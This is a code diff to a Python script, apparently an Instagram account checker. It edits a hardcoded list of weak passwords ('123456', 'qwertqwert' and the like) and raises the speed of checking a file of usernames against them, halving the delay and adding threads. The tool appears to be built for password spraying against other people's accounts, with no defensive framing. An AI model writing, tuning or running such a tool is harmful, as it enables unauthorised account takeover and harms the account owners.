@@ -84,11 +84,10 @@ class iNstagramChecker:
         }
 
         self.fixedPasswords = [
-            "mmnnbbvv","zzzzxxxx","mmmmnnnn", "aassddff", "qqwweerrtt", "qqwweerr",
-            "qwertqwert", "qwerqwer", "qqqqwwww", "ppooiiuu","aaaassss","123456","112233",
-            "zzxxccvv", "1234@@@@", "11223344@@", "123456@@","asdfghjkl","iloveyou",
+            "mmnnbbvv","zzzzxxxx","123456@@","mmmmnnnn", "aassddff", "qqwweerrtt", "qqwweerr",
+            "qwertqwert", "qwerqwer", "qqqqwwww", "ppooiiuu","aaaassss",
+            "zzxxccvv", "1234@@@@", "11223344@@",
         ]
-
     def pRintLogo(self):
         os.system('cls' if os.name == 'nt' else 'clear')
         logo = f"""
@@ -387,4 +386,4 @@ class iNstagramChecker:
 if __name__ == "__main__":
     checker = iNstagramChecker()
     checker.pRintLogo()
-    checker.cHeckAccounts("usernames.txt", delaySeconds=1, numThreads=4)
+    checker.cHeckAccounts("usernames.txt", delaySeconds=0.5, numThreads=5)
